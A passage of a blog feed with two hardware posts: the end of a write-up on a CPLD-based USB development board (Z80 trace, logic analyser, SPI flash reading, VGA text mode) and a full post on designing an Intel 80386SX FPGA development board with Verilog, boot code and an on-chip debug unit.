+            recvbuff += chr(data)
+            print(" | Data: {:02x} ({})".format(data, chr(data)), end='')
+
+        # Stop main loop when CPU reaches the halt state
+        elif (state == Z80State.HALTED):
+            break
+        print()
+
+    print("Received string: [{}]".format(recvbuff))
+
+    -- 
+    Z80State.FETCH   	-- Addr: 0000
+    Z80State.MEMRD   	-- Addr: 0001
+    Z80State.MEMRD   	-- Addr: 0002
+    Z80State.MEMRD   	-- Addr: 000a
+    Z80State.MEMRD   	-- Addr: 000b
+    Z80State.FETCH   	-- Addr: 0003
+    Z80State.MEMRD   	-- Addr: 0004
+    Z80State.FETCH   	-- Addr: 0005
+    Z80State.MEMRD   	-- Addr: 0006
+    Z80State.FETCH   	-- Addr: 0007
+    Z80State.FETCH   	-- Addr: 0008
+    Z80State.MEMRD   	-- Addr: 000c
+    Z80State.IOWR   	-- Addr: 0200 | Data: 4c (L)
+    Z80State.FETCH   	-- Addr: 0007
+    Z80State.FETCH   	-- Addr: 0008
+    Z80State.MEMRD   	-- Addr: 000d
+    Z80State.IOWR   	-- Addr: 0100 | Data: 53 (S)
+    Z80State.FETCH   	-- Addr: 0007
+    Z80State.FETCH   	-- Addr: 0008
+    Z80State.MEMRD   	-- Addr: 000e
+    Z80State.IOWR   	-- Addr: 0000 | Data: 45 (E)
+    Z80State.FETCH   	-- Addr: 0009
+    Z80State.HALTED   	-- Addr: 001f
+
+    Received string: [LSE]
+
+## Chapter V: The Feebleness Appears
+
+In a meantime, the two other tinkerers were focussed on testing the
+main board on some more pragmatic scenarios in order to check its limitations
+with the hope to serve a real purpose.
+
+### Section I: The Relativity of Space...
+
+Their experience with the implementation of a JTAG module were marked by the
+difficulty to debug and trace the state of the digital design. As the
+northbridge and the internal bus logic were considered reliable enough, they
+decided to implement an `IOModule` exclusively designed to probe any other
+signals of the IO controller design.
+
+Acting as an internal logic analyser, a probing circuit composed of one control
+register fed by a FIFO was generated for each probed signals.
+
+The capture was triggered by a special configurable signal and could be reset
+by the host at any moment.
+
+[![](/medias/images/bmii/la_bd.svg)](/medias/images/bmii/la_bd.svg)
+
+As an example, the following design made the main board to act as a very cheap
+logic analyzer where all IO signals were simultaneously probed. The trigger was
+wired to the physical switch input:
+
+    :::python
+    b = BMII()
+    la = LogicAnalyzer(4) # Probing FIFO of 4 elements
+    b.add_module(la)
+
+    sb = b.modules.southbridge.iomodule
+
+    #        Probe name     Width   Signal
+    la.probe("IO1L",        8,      sb.cregs.PINSCAN1L)
+    la.probe("IO1H",        8,      sb.cregs.PINSCAN1H)
+    la.probe("IO2L",        8,      sb.cregs.PINSCAN2L)
+    la.probe("IO2H",        8,      sb.cregs.PINSCAN2H)
+    la.probe("IOMISC",      8,      sb.cregs.PINSCANMISC)
+
+    la.set_trigger(~sb.cregs.PINSCANMISC.SW)
+
+In parallel of that, an implementation of a master SPI module was in
+development. It was a perfect test case for the logic analyzer as it was not
+yet tested on a real SPI slave.
+
+    :::python
+    from bmii.modules.spi import SPIMaster
+    from bmii.modules.spidev import SerialFlash
+
+    b = BMII.default()
+    spi = SPIMaster.default(b)
+
+    la.probe("SCLK", 1, spi.iomodule.iosignals.SCLK)
+    la.probe("SS0", 1, spi.iomodule.iosignals.SS0)
+    la.probe("MOSI", 1, spi.iomodule.iosignals.MOSI)
+
+    la.set_trigger(spi.iomodule.cregs.TX.wr_pulse)
+
+The SPI module initiated a transaction when its `TX` register was written. Its
+`wr_pulse` was then used to define the trigger of the logic analyzer as the
+goal was to analyse the output signal during an SPI activity.
+
+The `capture` method of a logic analyzer object waited for a capture be
+completed and then dequeued the samples by reading the control register of each
+probe.
+
+    la.reset()
+    spi.select_slave(0)
+    spi.tranceive(42)
+
+    la.capture()
+    la.show()
+
+Finally, the `show` method could be used to generate the captured waveforms to
+a VCD file and to display it using [gtkwave](http://gtkwave.sourceforge.net/):
+
+![](/medias/images/bmii/la_wf.png)
+
+However, each probe circuit was significantly logicblock-consuming which
+limited the use of tiny FIFO making the logic analyser useless on complex
+circuit.
+
+### Section II: ...And Time
+
+After this first disappointment related to the quite limited space provided by
+the CPLD, they pursue their work on the SPI module by implementing required
+operations to drive a JEDEC-compliant serial flash memory.
+
+    :::python
+    sf = SerialFlash.default(b, spi, slave_id=0)
+    sf.read_id()
+    -- 
+    Manufacturer ID: 0xC2 (Macronix)
+    Memory Type: 0x20
+    Memory Capacity: 0x15 (16Mb)
+
+Driving the SPI flash was actually quite easy when it was previously extracted
+from its original circuit. This one was desoldered from a PC motherboard:
+
+    :::python
+    sf.dump(0x1FE000, size=25)
+
+    b'Award BootBlock BIOS v1.0'
+
+The real challenge could be to probe the SPI packet in a passive way. This
+implied to base the `IOModule` logic on the SPI clock imposed by an external
+device instead of the regular system clock. Even though all this logic had been
+implemented and tested on simple devices, it was still returning malformed data
+when used on a PC motherboard since the BIOS flash was clocked at a frequency
+higher than 40MHz.
+
+Their guess for the reason of this issue was based on the fact that no IO pins
+were connected to a clock input of the CPLD. This meant that the SPI clock was
+gated by a regular IO input not designed to support such high frequency.
+
+![](/medias/images/bmii/bmii_spi_flash.jpg)
+
+## Chapter VI: Displayed As Of Yore
+
+Affected by these previous failures, the two first tinkerers doubted about the
+real efficiency of the current hardware design of their board. By curiosity and
+driven by their discouragement, they look for the third one, probably lost in
+his solo projects.
+
+They found him in its basement, soldering wires and axial resistors to a VGA
+connector. He explained that he was oddly trying to make the main board acting
+as a video card. That was a plain useless job but he was glad to do it. Bored,
+the two other tried to helped him to finish and agreed that it would be their
+last experience with their board.
+
+### Section I: The Dilemma Of Etching Copper
+
+Although driving VGA signals was something quite simple, they estimated that
+creating a dedicated expansion board would make their job easier. Firstly, it
+would allow the mechanical integration of a decent VGA connector. Secondly,
+it was a good opportunity to add some extra memories to the board as the CPLD
+would not be able to store enough data needed to implement a video card.
+A standard 128KB static RAM packaged in a SSOP package has been chosen due to
+to its simple interface and its fast respond time.
+
+The VGA's RGB pins must be driven by analog signals which implied the use of
+Digital to Analog Converters to be controlled from the CPLD. As these signals
+were defined to be ground terminated by a 75 Ohm resistor on the monitor side,
+a cheap equivalent of a DAC could be obtained by connecting different resistors
+to several CPLD's outputs, connected in parallel and acting as a voltage
+divider with monitor's termination resistor (see `R1` to `R6`).
+
+By allocating 6 outputs for driving RGB signals, 64 colors could be generated.
+However, the limited number of IO pins prevented the usage of all of the 17-pin
+SRAM's address bus in the same time that the 6 pins of the RGB signals.
+
+In order to postpone this design decision, jumpers had been added to the
+extension PCB to allow the configuration at soldering-time. The first setting
+allowed the usage of 8 colors with a 256KB video RAM while the second one
+constrained the use of a 16KB RAM but could drive 64 colors (see table at the
+bottom layer of the PCB).
+
+[![](/medias/images/bmii/sch/bmiivideo.svg)](/medias/images/bmii/sch/bmiivideo.svg)
+
+[![](/medias/images/bmii/pcb_video.png)](/medias/images/bmii/pcb_video.png)
+
+![](/medias/images/bmii/bmiivideo.jpg)
+
+### Section II: A Proselytized Static Memory
+
+On a regular video card, framebuffer was supposed to be stored on a dual-port RAM
+in order to allow the controller to write displayed frame in the same time
+that it was read by the signal generator. As this kind of device must be
+controlled by a large number of pin, a regular SRAM had been used to substitute
+a real VRAM.
+
+Of course, this tweak forced a tighter management of the VRAM as two
+independents actors were using it at the same time while providing a unique
+interface.
+
+From a high-level point of view the simple video card could be represented as an
+`IOModule` by following this architecture:
+
+[![](/medias/images/bmii/video_bd.svg)](/medias/images/bmii/video_bd.svg)
+
+To manage the VRAM, the trick was to exploit the fact that the pixel clock
+required to display with a resolution of 640x480 at 60Hz was fixed to 25.175
+MHz. As the IO controller was clocked at 48MHz, odd ticks were used to read
+from VRAM and to drive the pixel clock at 24Mhz which was acceptable for most of
+the recent VGA monitors. Meanwhile, even ticks where used to perform the write
+operations on the VRAM. To ensure that writing operations were successful, the
+read operation that followed a writing was cancelled which  was
+not critical most of the time but could led to small display glitches
+
+The VRAM management unit could be described with the following state-machine:
+
+- 1: If a write operation has to be performed, then, drive the data and the
+    address bus. Else, drive the address bus for the next reading.
+- 2: Reading state: Capture the output of the VRAM
+- 3: Writing state: Indicate to the VRAM that the data bus is ready to be read
+    for a memory writing.
+
+[![](/medias/images/bmii/video_wf.svg)](/medias/images/bmii/video_wf.svg)
+
+### Section III: Words Engraved In A Black Screen
+
+As the VRAM management core logic and the VGA signal generation was correctly
+working, only the logic needed to drive the read from the VRAM and to drive RGB
+signals according to VRAM's data had to be adapted to modify the displaying.
+
+To demonstrate how the VRAM could be managed, a simple text mode had been
+implemented.
+
+VRAM had been organized as follow:
+
+- `0x0000` - Text framebuffer: as the VGA-compatible text mode implemented on PC
+    platforms, each characters consisted of one byte for the ASCII code and a
+    second contained the color.
+- `0x0700` - Character set (3KB): Sprites representing each character. A font
+    similar to the IBM's code page 437 was used.
+
+As only one reading on the VRAM was possible per pixel clock tick, reading
+sequence had to be aligned to the character display. While the three last
+pixels of a character, the VRAM reading logic fetched the ASCII code and the
+color of the next character on the framebuffer and provided to the display
+logic the corresponding sprite's row from the character set.
+
+[![](/medias/images/bmii/textmode_wf.svg)](/medias/images/bmii/textmode_wf.svg)
+
+[![](/medias/images/bmii/bmii_text.jpg)](/medias/images/bmii/bmii_text.jpg)
+
+## Epilogue
+
+Surprisingly, the two first tinkerers found unexpected satisfaction to complete
+this dumb video card. The result of this last experience reflected the childish
+feelings that pushed them to start their first board: a satisfying design
+serving a useless objective.
+
+This forced step-back helped them to highlight the items that could improve the
+next version of the board, if someone would be brave enough to go on on their
+footsteps. The lack of logic blocks could be easily solved by switching to an
+FPGA. A lot of decent ones were still available in 144-pin EQFP packages.
+Allocating pins to an external RAM would also not be a waste. Many other
+applications were blocked by the lack of an embedded and easy to use memory.
+
+Concerning the timing issues encountered while probing the SPI flash, simply
+mapping some clock inputs to physical headers would be enough to unscramble
+most of them.
+
+After that, the tinkerers team split up. Each of them had been aligned to the
+'state-of-art'-ish folk and they finally scattered, where engineers dwell...
+
+![](/medias/images/bmii/workshop.jpg)
+
+### References
+
+#### Sources
+
+- [Git repository](https://github.com/psurply/bmii)
+- [Migen](https://github.com/m-labs/migen)
+- [PyUSB](https://github.com/walac/pyusb)
+
+#### Datasheets
+
+- [Altera Max V handbook](https://www.altera.com/en_US/pdfs/literature/hb/max-v/max5_handbook.pdf)
+- [Cypress EZ-USB FX2LP](www.cypress.com/file/126446)
+- [Z84C00 Specifications](www.zilog.com/manage_directlink.php?filepath=docs/z80/ps0178&amp;extn=.pdf)
+
+-- 
+Pierre Surply
+</content>
+    <link href="http://blog.psurply.com/0005-one_device_to_drive_them_all.txt" rel="alternate"/>
+    <published>2016-10-24T00:00:00+02:00</published>
+  </entry>
+  <entry>
+    <id>urn:uuid:505431e4-4311-5470-877d-d01915feb7f5</id>
+    <title>Designing an Intel 80386SX development board</title>
+    <updated>2015-11-16T00:00:00+01:00</updated>
+    <author>
+      <name>Pierre Surply</name>
+      <email>surply@lse.epita.fr</email>
+    </author>
+    <content type="text">The LSE-PC aims to be a compact IBM-PC compatible development board based on an
+Intel `80386SX` CPU and an Altera *Cyclone IV* `EP4CE22E22` FPGA in order to
+emulate a custom chipset.
+
+The main goal of this project is to create a simple, debuggable and customisable
+version of the well-known PC hardware architecture. Its purpose is mainly
+didactic for students or experienced developers who want to get started into x86
+low-level programming.
+
+## Hardware Overview
+
+The schematics were designed using [gschem](http://www.geda-project.org/) which
+is a part of the gEDA project. Although the provided component library is
+acceptable, most of the chips used on this board are outlandish and so need to
+be drawn before starting overall schematics. This rude work was achieved by
+using
+[djboxsym](http://www.gedasymbols.org/user/dj_delorie/tools/djboxsym.html) tool
+which allows quick production of gschem symbols from a minimal description.
+
+### Central Processing Unit
+
+The CPU used on this board is a `80386SX` designed by *Intel* and released in
+1986. It is basically a cut-down version of the original `386` with a 16-bit
+physical data bus. Although memory access performance is hardly affected, it is
+still fully 32-bit internally and was designed to be used in a 16-bit
+environment which is simpler and cheaper to design that a full 32-bit
+compatible motherboard. The physical address bus is only 24-bit which limits
+address space to 16MB.
+
+The model used here is an `NG80386SXLP20` which is a *low power* version
+clocked at 20MHz and packaged in a 100-pin Plastic Quad Flat pack. Of course,
+this chip is today considered obsolete but is still the only 32-bit x86 CPU
+which is simple enough to be integrated in an amateur board.
+
+### Field-Programmable Gate Array
+
+The main criterion for choosing an appropriate FPGA was about packaging.
+Knowing that this chip will be hand-soldered, selecting a Ball Grid Array based
+component was inconceivable. I'm also quite used to work with Altera's FPGA so
+one from the *Cyclone IV* series was a good compromise. The model chosen is an
+`EP4CE22E22C7N` released in 2009. With its 22320 logic elements, it is one of
+the largest FPGA available on EQFP. This package, only used by Altera, is an
+enhanced version of the standard plastic quad flat package which uses a step of
+0.5 millimeter between each pins. This layout allows the FPGA to expose 144 pins
+where 62 can be used as I/O and 15 as clock inputs.
+
+An other useful feature is the 3.3V PCI compliant mode of the IO banks.
+It provides compatibility with 5V devices by enabling a clamping diode which can
+supports 25mA. This explains the use of 120 Ohms resistors between CPU 5V
+signals and FPGA IO.
+
+[![](/medias/images/lsepc/sch_cpu.svg)](/medias/images/lsepc/sch_cpu.svg)
+
+The CPU needs a 20MHz input clock to operate correctly. A unique oscillator is
+used to clock CPU and FPGA. The idea here is to assume that if the FPGA needs a
+higher clock speed, the use of an internal Phase Locked Loop will be considered
+to obtain the desired frequency from this 20MHz clock.
+
+[![](/medias/images/lsepc/sch_io.svg)](/medias/images/lsepc/sch_io.svg)
+
+FPGA programming and debugging can be performed through JTAG. Altera provides
+a dedicated programmer called the *USB Blaster* which can be easily used with
+*Quartus II*. It provides a standard 10-pin connector and operates here at 2.5V.
+
+As FPGA configuration is volatile, it is necessary to provide an external way
+to program it when the board is powered on. Here this is achieved by an external
+serial flash which contains the whole FPGA configuration. Altera sells `EPCQ`
+devices which are dedicated to that purpose. However, most of the time those
+are expensive and it turns out that they are nothing more than SPI flash
+memories.
+That is why it has been decided to use an `M25P16`, a 16Mbits flash memory from
+*Micron* which perfectly do the job.
+
+In fact, several programming modes are available in this FPGA. In order to
+indicate what mode has to be used, `MSEL` pins must be pulled-up or pulled-down
+to encode the mode number. To select the Active Serial Programming mode, it is
+necessary to solder 120 Ohms resistors on `R77`, `R79` and `R81`.
+
+[![](/medias/images/lsepc/sch_conf.svg)](/medias/images/lsepc/sch_conf.svg)
+
+### USB/UART bridge
+
+In addition to JTAG, it can be a good idea to provide USB connectivity to this
+design. However, implementing USB protocol stack in an FPGA can be really
+painful. The purpose of the `FT230X` chip is to provide a simple bridge between
+an USB and an UART interface which is simpler to implement in an FPGA. It is
+provided in a SSOP16 package and is really simple to wire thanks notably to the
+fully integrated clock generation which does no require an external crystal.
+
+[![](/medias/images/lsepc/sch_usb.svg)](/medias/images/lsepc/sch_usb.svg)
+
+### Static Random Access Memory
+
+For the main RAM, `AS6C8016` from *Alliance Memory* has been chosen. This is a
+512K x 16-bit CMOS static RAM packaged in a 44-pin TSOP. It features tri-state
+output and data byte control (`LB` and `UB` signals) as required by the
+`80386SX`.
+
+Although this chip was originally designed to be used as a battery backed-up
+non-volatile memory, its usage simplicity and its response time justify the low
+storage space. So 1MB ought to be enough for anybody. Also, `AS6C8016` is
+powered by 5V but is still fully TTL compatible which means that it can be
+driven by the CPU as well as the 3.3V outputted by FPGA's IO. So control signals
+as `RAMCS` and `RAMWE` are only driven by the FPGA which will perform address
+decoding.
+
+[![](/medias/images/lsepc/sch_ram.svg)](/medias/images/lsepc/sch_ram.svg)
+
+### Voltage Regulation
+
+The power circuitry has to provide four sources of different voltages:
+
+- *5V*: CPU, SRAM
+- *3.3V*: FPGA In/Out
+- *2.5V*: FPGA Analog PLL
+- *1.2V*: FPGA internal logic, Digital PLL
+
+Regulation is achieved by three fixed low drop positive voltage regulators which
+operate from the 5V supplied by the USB. Even though fixed regulators are often
+more expensive that adjustable regulators, they are easier to wire and reduce
+the number of passive components needed to perform adjustment. Only 250mA are
+provided for 2.5V because it is only used by FPGA Analog PLL and JTAG target
+voltage.
+
+[![](/medias/images/lsepc/sch_power.svg)](/medias/images/lsepc/sch_power.svg)
+
+### Routing and Manufacturing the Printed Circuit Board
+
+Once the schematics completed, PCB has to be designed. This process has been
+assisted by [*pcb*](http://pcb.geda-project.org/), an other part of gEDA project.
+As schematics and PCB designs are not performed using the same software (as
+KiCad or Eagle do), synchronization between those is ensured thanks to the
+[gsch2pcb](http://wiki.geda-project.org/geda:gsch2pcb_tutorial) tool.
+
+As some components on the board do not use standard packages, creating custom
+*pcb* footprint for those chip is necessary. Like symbols generation,
+footprints was generated using
+[footgen](http://dlharmon.com/geda/footgen.html).
+
+The PCB routing here is a bit tricky due to the large number of signals needed
+to drive the CPU. A 4-layer PCB is unavoidable in order to achieve routing and
+to preserve signal integrity. As our manufacturer limits 4-layer board 5 x
+10cm, this is the dimension adopted which is large enough for this design.
+
+Each layer has a dedicated purpose:
+
+- *Top layer* : it is mainly used for signals routing. Traces used for data
+    signal are 0.20mm width which is the limit imposed by manufacturer. Unused
+    spaces are recycled to ground planes. FPGA, CPU and voltage regulators are
+    soldered on this layer.
+- *Ground layer* : Used almost exclusively to get a common ground plane in the
+    whole circuit. It has also been used to complete RAM routing.
+- *Power layer* : Dedicated to conduct power rails through the board. Four areas
+    corresponding to each voltage level can be clearly seen on this layer.
+- *Bottom layer* : Like the top layer, this is mainly used for signals routing.
+    Capacitors used to apply local filtering are soldered on this side as well
+    as SRAM and 20MHz oscillator.
+
+With a low end SMD soldering station, it takes approximately three hours to
+solder a whole board.
+
+In addition to PCB, acrylic case was designed using
+[FreeCAD](http://www.freecadweb.org/) and then manufactured.
+
+
+[![](/medias/images/lsepc/pcb_layers.png)](/medias/images/lsepc/pcb_layers.png)
+
+![](/medias/images/lsepc/pcb.jpg)
+
+## Emulating a rudimentary chipset
+
+Now that the board is correctly soldered, the last thing to do before being able
+to run code on the CPU is to configure the FPGA in order to emulate a basic
+chipset.  The design is composed of two parts : the bus controller and the memory
+controller.
+
+### Bus Controller
+
+The bus controller has to handle `80386SX` bus access protocol. In order to
+understand the exact purpose of it, it is necessary to detail signals involved
+in the process.
+
+- The *Data Bus* (`D[15:0]`) is composed of three-state bidirectional signals
+    providing a general purpose data path between `386` and other devices (such
+    as memory).
+- The *Address Bus* (`A[23:1]`, `BHE#`, `BLE#`) is composed of three-state
+    outputs providing physical memory addresses or I/O port addresses. The Byte
+    Enable outputs (`BHE#` and `BLE#`) indicate which bytes of the 16-bit data
+    bus are involved with the current transfer. If both of them are asserted,
+    then 16 bits word is being transferred,
+- A *Bus Cycle* is defined by `W/R#`, `D/C#`, `M/IO#` and `LOCK#` three-state
+    outputs. `W/R#` distinguishes between write and read cycles, `D/C#`
+    distinguishes between data and control cycles, `M/IO#` distinguishes between
+    memory and I/O cycles and `#LOCK` indicates if the current operation is
+    atomic or not.
+- The *Bus Access* is controlled by `ADS#`, `READY#` and `NA#`.
+    The *Address Status* (`ADS#`) indicates that a valid bus cycle definition
+    and address are being driven from the `386` pins. Most of the bus controller
+    logic must be based on the falling-edge of this signal. `READY#` signal
+    indicates a transfer acknowledge driven by the bus controller to the `386`.
+    `NA#` signal is used to request address pipelining which is not relevant in
+    this case.
+
+As an example, here is a waveform of bus signals during these operations :
+
+- Write *data1* to *address1*
+- Read *data2* from *address2*
+- Write *data3* to *address3*
+- Idle
+- Read *data4* from *address4*
+
+[![](/medias/images/lsepc/bc_wave.svg)](/medias/images/lsepc/bc_wave.svg)
+
+Each bus access operates in two steps. The first one, indicated by `ADS#` is
+used to drive *Bus Cycle Definition* signals and an address. The second one take
+place during the next rising edge of the main clock. Depending on the `W/R#` pin
+state, the data bus is driven with the value the CPU wants to write. During all
+these sequences `ADS#` is still asserted.
+
+The next bus cycle is performed when the `386` detects a falling edge on the
+`READY#` signal. So the bus controller can be easily modeled as the following
+Finite-State Machine :
+
+![](/medias/images/lsepc/bc_fsm.svg)
+
+It is simple to implement this behavior in Verilog :
+
+    :::verilog
+    always @(posedge clk)
+    begin
+        if (!_ads) begin
+            capture_bus(); // Capture values driven on
+                           // A[23:1], D[15:0], /BLE, /BHE, WR, DC and MIO
+            _ready &lt;= 1;
+            state &lt;= `ST_T1;
+        end else if (state == `ST_T1) begin
+            _ready &lt;= 0;
+            state &lt;= `ST_T2;
+        end
+    end
+
+As *data bus* is bidirectional, it is sometimes necessary to set it in high
+impedance in order to let another device driving the bus. It is also needed to
+respect bytes requested by the CPU via `BHE#` and `BLE#`.
+
+    :::verilog
+    assign d[15:8] = wr || _bhe || !ramcs ? 8'hzz : dout[15:8];
+    assign d[7:0] = wr || _ble || !ramcs ? 8'hzz : dout[7:0];
+
+### Memory Controller
+
+Once the bus protocol is properly respected, the address requested by the CPU
+must be decoded in order to figure out which device must be selected. This is
+here the purpose of the memory controller unit.
+
+Altera Cyclone IV devices features embedded memory structures. It consists of
+*M9K* memory blocks that can be configured to provide various memory functions,
+such as RAM, shift registers or ROM. The idea here is to use it to create a
+small memory which is initialized with a basic piece of code dedicated to CPU
+initialization. An other useful feature of this memory is to be easily readable
+and editable through JTAG using the *In-System Content Editor* provided by
+*Quartus II*.
+
+Basically, the main address space is composed of two memories : an external (i.e.
+the SRAM) and an internal (i.e. the M9K blocks).
+
+The first megabyte of addressable memory is organized as the layout of the
+traditional IBM-PC. It means that only the first 640K of external memory are
+mapped from `0x000000` to `0x0A0000` and BIOS shadow ROM (implemented here
+with internal memory) is mapped from `0x0F8000` to `0x100000`. Shadow ROM was
+originally a 64KB memory which contains a copy of the BIOS ROM mapped on the
+last 64KB of the address space. As the CPU starts fetching instructions at
+`0xFFFFF0` after a reset, the mechanism consists of mapping a ROM at this
+address, copying ROM content on the shadow ROM and then jumping on a subroutine
+located on the first megabyte.
+
+Here, the internal RAM is only 32KB due to the FPGA limitations and is located
+at `0xFF8000` and `0x0F8000` which allows simulation of the original machinery.
+Moreover, the whole SRAM is mapped from 1MB which means that first 640KB of
+external RAM are mapped twice.
+
+Memory controller unit can be simplified as :
+
+[![](/medias/images/lsepc/memory_map.svg)](/medias/images/lsepc/memory_map.svg)
+
+The actual address space layout is achieved by applying a logic expression
+to the *chip select* signal of each memory. Notice that `WE#` signal of SRAM
+is not active on the same level that `W/R#` `386` signal. So this signal is
+inverted by the FPGA.
+
+    :::verilog
+    assign eramwe = !wr;
+    assign eramcs = !(cs &amp;&amp; ((addr[23:16] &lt; 8'h0A)
+                     || (addr[23:20] == 4'h1)));
+    assign iramcs = cs &amp;&amp; ((addr[23:15] == 9'h1FF)
+                    || (addr[23:15] == 9'h01F));
+
+### Skeleton of a basic firmware
+
+As an example, this section will present a basic firmware which can be run on
+the LSE-PC.
+
+Firstly, it is considered here that the entire firmware will be located on the
+internal memory which is automatically initialized when the design is loaded
+into the FPGA.
+
+On reset, the `80386` CPU is running in real mode and will start to execute
+the instructions located at the end of the address space: `0xFFFFF0`. So the
+purpose of these instructions are to jump to the first megabyte by reloading
+*Code Segment*. However, the last 16 bytes can be used to set a minimal
+environment to allow 16-bit application execution. The following code is an
+example of 5 instructions that can be assembled to 16 bytes of opcodes. It
+basically sets *Data*, *Stack* and *Code Segment Selector*, sets the *stack
+pointer* and then jumps to the beginning of the internal ram mapped at
+`0x8000`.
+
+    :::nasm
+    org 0xFFF0  ;; CS:0xF000, IP:0xFFF0
+    reset:
+            mov ax, 0xF000
+            mov ds, ax
+            mov ss, ax
+            mov sp, 0xFFF0
+            jmp 0xF000:0x8000
+
+Now that the execution flow has exited the *reset state*, it is now possible to
+set the CPU to protected mode. This can be achieved by loading a simple *Global
+Descriptor Table* which defines memory segments that will be used in protected
+mode. Notice that the jump to `reload_segs` is used to flush instruction
+the prefetch queue after enabling protected mode in order to validate segment
+reloading. This code can be improved by the setting of an
+*Interrupt Descriptor Table* in addition of a *Global Descriptor Table*.
+
+    :::nasm
+    org 0x8000
+    startup:
+            lgdt [gdtr]             ;; Load Glocal Descriptor Table
+
+            mov eax, cr0            ;; Enable protected mode
+            or eax, 1
+            mov cr0, eax
+
+            jmp reload_segs         ;; Flush prefetch queue
+
+    reload_segs:
+            mov ax, 0x10            ;; Reload segment selectors
+            mov ds, ax
+            mov es, ax
+            mov fs, ax
+            mov gs, ax
+            mov ss, ax
+
+            ;; ljmp 0x08:0xF8400
+            dw 0xEA66               ;; Reload CS and jump to application code
+            dd 0xF8400
+            dw 0x08
+
+    align 16
+    gdt:    ...
+    gdtr:
+            Limit dw gdtr - gdt - 1
+            Base dd 0xF0000 + gdt
+
+A 32-bit application can then be located at 0xF8400. The internal RAM is
+segmented according to the following layout :
+
+[![](/medias/images/lsepc/pm_map.svg)](/medias/images/lsepc/pm_map.svg)
+
+As the *In-Sytem Memory Content Editor* accepts a special binary format called
+*MIF* (Memory Initialization File), a dedicated *OCaml* script has been created
+to facilitate linking of several raw binary object files.
+
+    :::sh
+    bin2mif -o fw.mif
+        -b 0xF8000 0 \              # Memory base address
+        -i pm.bin 0xF8000 0 \       # Jump to protected mode code
+        -i app.bin 0xFC000 0 \      # Application code
+        -i reset.bin 0xFFFF0 0      # Reset routine code
+
+
+
+## Providing debug facilities
+
+Even though Altera's FPGA provide an efficient internal signal analyser thanks
+to *SignalTap*, it is a real pain to make software debugging when the size
+of applications running on the `386` become significant. Adding a flexible
+on-chip debug facility based on the UART communication to this design is one of
+the main challenge of this project.
+
+![](/medias/images/lsepc/app.svg)
+
+### Supervisor
+
+The supervisor is designed using Altera's QSys tool which assists the creation
+of systems based on the *NIOS II* soft-processor. This system is composed of a
+private on-chip memory which contains *NIOS* instructions and data, and of an
+UART which is connected to `FT230X` chip.
+
+The protocol between the host and the supervisor is pretty simple and it
+considers that the CPU is at any time in one of these states :
+
+- `STOP` : CPU is stopped. `RESET` signal is asserted.
+- `RUN` : CPU is running.
+- `IORD` / `IOWR` : CPU is trying to perform an access to IO ports. Distinction
+    between *read* and *write* operation is done. Those states are used to allow
+    device emulation.
+- `BRK16` / `BRK32` : CPU is ready to accept debug operations. Distinction
+    between *real* and *protected* mode is done.
+
+It is accurate to implement the protocol logic through *NIOS* software instead
+of having it hardwired in Verilog. However, directly handling `386` signals on
+the *NIOS* is inefficient due to execution speed of this system. The idea here
+is to export the `386` signal handling job to an other module dedicated to it :
+the *On-Chip Debug Unit*.
+
+The *OCD Unit* can take the control of `386` buses at anytime by asserting the
+`ocd.en` signal, which disable the original bus controller described before.
+The communication between those two units is ensured by a dual-port shared
+memory accessible through *Avalon* bus and two PIO registers.  The first one,
+`OCD_CTL`, is used to reset the *OCD Unit* from supervisor. The second,
+`OCD_STATUS` indicates if the unit is running or not. The shared memory
+contains a routine that must be applied on `386`.
+
+[![](/medias/images/lsepc/ocd_overview.svg)](/medias/images/lsepc/ocd_overview.svg)
+
+### On-Chip Debug Unit
+
+This unit is basically a processor specially designed to handle `386` signals.
+It fetches its instructions from the 256 x 16-bit *Avalon* memory filled by the
+supervisor and operates on a 16 x 16-bit data space also located on shared
+memory.
+
+While supervisor can access OCD program and data unrestrictedly, the
+*OCD Unit* can only operates on its data space which corresponds to offset
+`0x100` from supervisor point of view. In the dedicated assembler, data memory
+is addressed using `R1` to `R15` naming convention.
+
+    :::verilog
+    module ocd
+    (
+        // OCD Control
+        input rst,          // Connected to OCD_CTL
+        input clk,          // 40MHz clock (synchronous with 20MHz CPU clock)
+        output reg en,      // Asserted if OCD Unit is attached to the 386
+        output reg stop,    // Connected to OCD_STATUS
+
+        // 80386 signals
+        ...
+        // RAM signals (Avalon)
+        ...
+    );
+
+Implementing this kind of processor is quite simple and a basic one will be
+based on the following state machine :
+
+![](/medias/images/lsepc/ocd_fsm.svg)
+
+As *Avalon* memory signals are always latched, reading on it takes two clock
+cycles : the first cycle is used to latch the address value and the second one
+latches the result on the data bus. Taking that into account, execution of a
+single instruction which reads and writes on data memory cannot take less than
+five clock cycles.
+
+- *FETCH* : Get instruction from program memory.
+- *LOAD* : Latch source address into data memory.
+- *EXEC* : Load source value from data memory and execute the instruction.
+- *STORE* : Store result and compute next address of the next instruction.
+- *LATCH* : Latch instruction address into program memory.
+
+
+Instruction set is composed of several categories. The first one is used to
+control the OCD :
+
+- `ATTACH`/`DETACH` : Connect/Disconnect the OCD unit to 386 signals.
+
+The second category includes instructions related to `386` signals processing :
+
+- `LDD d` : Load *data bus* value into `d` register.
+- `LDAL d` / `LDAH d` : Load *address bus* value into `d` register.
+- `LDWR d` : Load `W/R#` signal into `d` register.
+- `LDDC d` : Load `D/C#` signal into `d` register.
+- `LDMIO d` : Load `M/IO#` signal into `d` register.
+- `STD s` : Set *data bus* value to `s` register value.
+- `START`/`RESET` : Start/Reset the CPU.
+- `READY` : Assert `READY#` signal.
+
+Of course, some instructions only operate on registers :
+
+- `LDI d, imm16` : Load a 16-bit immediate into `d` register.
+- `MOV d, s` : Move `s` register value into `d` register.
+- `CLR d` : Clear `d` register.
+
+Third category is about flow control. As the data memory only exposes one port
+to the *OCD Unit*, implementing a *compare* instruction which loads two
+registers is not possible in a single cycle. So a *compare register* as been
+added to the core. All comparisons will be related to that register.
+
+- `LDCMP s` : Load `s` register value into the *compare register*.
+- `CMP s` : Compare `s` register value with *compare register* value and store
+    the result into the *compare register*.
+- `BA`/`BEQ`/`BNE addr` : Branch to the specified address according to
+    *compare register* value.
+
+As example, those instructions performs a jump to `label` if R1 is equal to R2 :
+
+    :::nasm
+        LDCMP R1    ;; cmpr &lt;- R1
+        CMP R2      ;; cmpr &lt;- cmpr == R2
+        BEQ label   ;; pc &lt;- label if cmpr != 0
+
+Some instructions can stay more than one cycle in the *EXEC* state order to wait
+for an acknowledge from the CPU during some bus operation :
+
+- `HOLD` : Assert `HOLD` signal and wait for `HOLDA` signal.
+- `INT` : Assert `INT` signal and wait for `INTA` signal.
